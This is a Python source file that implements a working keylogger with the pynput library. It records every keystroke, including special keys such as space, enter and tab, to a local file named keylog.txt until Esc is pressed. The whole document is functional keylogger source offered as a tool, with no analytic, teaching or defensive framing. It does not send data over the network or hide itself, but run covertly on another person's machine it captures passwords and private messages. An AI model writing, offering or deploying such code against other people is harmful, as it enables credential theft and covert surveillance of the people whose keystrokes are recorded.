import pynput
from pynput.keyboard import Key, Listener

# Path to the file where keystrokes will be logged
log_file = "keylog.txt"

# Function to log the keys pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                f.write(f"[{key}]")

# Function to stop the keylogger (optional)
def on_release(key):
    if key == Key.esc:  # Stop the keylogger when 'Esc' is pressed
        return False

# Listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
